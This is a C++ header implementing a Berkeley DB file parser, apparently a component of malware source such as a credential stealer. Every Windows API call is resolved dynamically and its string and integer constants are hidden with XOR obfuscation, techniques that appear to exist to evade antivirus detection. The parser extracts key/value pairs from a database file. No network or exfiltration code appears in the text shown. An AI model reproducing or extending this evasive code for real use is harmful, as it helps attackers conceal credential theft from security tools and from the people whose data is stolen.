#pragma once
#include <vector>
#include <string>
#include <Windows.h>
#include <algorithm>

#include "DynImport.h"
#include "xor.h"

#define XOR(x) XorStr(x)

using std::vector;
using std::string;

template<class T, class Y>
struct pair
{
	T Key;
	Y Value;
};

class BerkeleyDB
{
	void ReadFileAll(vector<byte> & bytes, const string & filePath) const
	{
		try
		{
			HANDLE hFile = FNC(CreateFileA, XOR("Kernel32.dll"))(filePath.c_str(), XorInt(GENERIC_READ),
				XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0,
				XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
			if (hFile != INVALID_HANDLE_VALUE)
			{
				DWORD dwSize = FNC(GetFileSize, XOR("Kernel32.dll"))(hFile, 0);
				char* buff = new char[dwSize];
				DWORD dwBytes;
				FNC(ReadFile, XOR("Kernel32.dll"))(hFile, buff, dwSize, &dwBytes, 0);
				FNC(CloseHandle, XOR("Kernel32.dll"))(hFile);
				for (DWORD i = 0; i < dwSize; ++i)
					bytes.push_back(buff[i]);
				delete[] buff;
			}
		}
		catch (...) { return; }
	}

	string DigToHexStr(unsigned int value) const
	{
		try
		{
			char* digit = XOR("0123456789ABCDEF");
			char stack[32];
			char out[33];

			int quot, rem;
			int digits = 0;

			do
			{
				quot = value / 16;
				rem = value % 16;

				stack[digits] = digit[rem];
				value = quot;
				++digits;
			} while (value);

			int i = 0;
			while (digits--)
				out[i++] = stack[digits];

			out[i] = 0;
			return string(out);
		}
		catch (...) { return string(); }
	}

	vector<byte> Extract(const vector<byte> & source, int start, int length, bool littleEndian)
	{
		try
		{
			vector<byte> arr(length);
			int num = 0;
			for (int i = start; i < start + length; ++i)
			{
				arr[num] = source[i];
				++num;
			}

			if (littleEndian)
			{
				for (int i = 0; i < (arr.size() / 2); ++i)
				{
					int tmp = arr[i];
					arr[i] = arr[arr.size() - i - 1];
					arr[arr.size() - i - 1] = tmp;
				}
			}

			return arr;
		}
		catch (...) { return vector<byte>(); }
	}

	string BitConverterToString(const vector<byte> & bytes) const
	{
		try
		{
			string res = "";
			for (byte b : bytes)
			{
				string converted = this->DigToHexStr((unsigned int)b);
				if (converted.size() == 1)
					res += '0';
				res += this->DigToHexStr((unsigned int)b);
			}
			return res;
		}
		catch (...) { return string(); }
	}

	int BitConverterToInt32(const vector<byte> & bytes) const
	{
		try
		{
			if (bytes.size() < 4)
				return 0;
			return int((unsigned char)(bytes[0]) << 24 |
				(unsigned char)(bytes[1]) << 16 |
				(unsigned char)(bytes[2]) << 8 |
				(unsigned char)(bytes[3]));
		}
		catch (...) { return 0; }
	}

	int StringToInt(const string & str) const
	{
		try
		{
			int res = 0;
			for (int i = str.size() - 1; i >= 0; --i)
			{
				int temp = str[i] - '0';
				if (str[i] >= 'A' && str[i] <= 'F')
					temp = str[i] - 'A' + 10;
				res += temp * (1 << (4 * (str.size() - i - 1))); // 16 pow (str.size() - i - 1)
			}
			return res;
		}
		catch (...) { return 0; }
	}

	string BytesToString(const vector<byte> & bytes) const
	{
		try
		{
			string res = "";
			for (byte b : bytes)
				res += b;
			return res;
		}
		catch (...) { return string(); }
	}

	bool _memcmp(void* buffer1, void* buffer2, size_t size) const
	{
		try
		{
			byte* buff1 = (byte*)buffer1;
			byte* buff2 = (byte*)buffer2;
			while (size--)
			{
				if (*buff1 != *buff2)
					return false;
				++buff1;
				++buff2;
			}
			return true;
		}
		catch (...) { return false; }
	}

	vector<pair<string, string>> Keys;
public:
	BerkeleyDB(const string & fileName, bool & b)
	{
		try
		{
			vector<byte> List;
			ReadFileAll(List, fileName);
			if (List.empty())
			{
				b = false;
				return;
			}

			vector<byte> value = this->Extract(List, 0, 4, false);
			if (!value.empty())
			{
				int num2 = BitConverterToInt32(this->Extract(List, 12, 4, false));
				int num3 = BitConverterToInt32(this->Extract(List, 56, 4, false));
				int num4 = 1;
				while (this->Keys.size() < num3)
				{
					vector<string> arr((num3 - this->Keys.size()) * 2);
					for (int j = 0; j < (num3 - this->Keys.size()) * 2; ++j)
						arr[j] = BitConverterToString(this->Extract(List, num2 * num4 + 2 + j * 2, 2, true));
					std::sort(arr.begin(), arr.end());
					for (int k = 0; k < arr.size(); k += 2)
					{
						int num5 = StringToInt(arr[k]) + num2 * num4;
						int num6 = StringToInt(arr[k + 1]) + num2 * num4;
						int num7 = (k + 2 >= arr.size()) ? (num2 + num2 * num4) : (StringToInt(arr[k + 2]) + num2 * num4);
						string str = BytesToString(this->Extract(List, num6, num7 - num6, false));
						string value2 = BitConverterToString(this->Extract(List, num5, num6 - num5, false));
						if (!str.empty())
							this->Keys.push_back({ str, value2 });
					}
					++num4;
				}
				return;
			}
		}
		catch (...) { return; }
	}

	string FindValue(const string & key)
	{
		try
		{
			string res = "";
			for (int i = 0; i < Keys.size(); ++i)
			{
				if (Keys[i].Key == key)
				{
					res = Keys[i].Value;
					break;
				}
			}

			string real = "";
			for (int i = 0; i < res.size(); ++i)
				if (res[i] != '-')
					real += res[i];
			return real;
		}
		catch (...) { return string(); }
	}

	string FindValue(byte* key, size_t sz)
	{
		try
		{
			string res = "";
			for (int i = 0; i < Keys.size(); ++i)
			{
				if (_memcmp((void*)Keys[i].Key.c_str(), key, sz))
				{
					res = Keys[i].Value;
					break;
				}
			}

			string real = "";
			for (int i = 0; i < res.size(); ++i)
				if (res[i] != '-')
					real += res[i];
			return real;
		}
		catch (...) { string(); }
		return string();
	}
};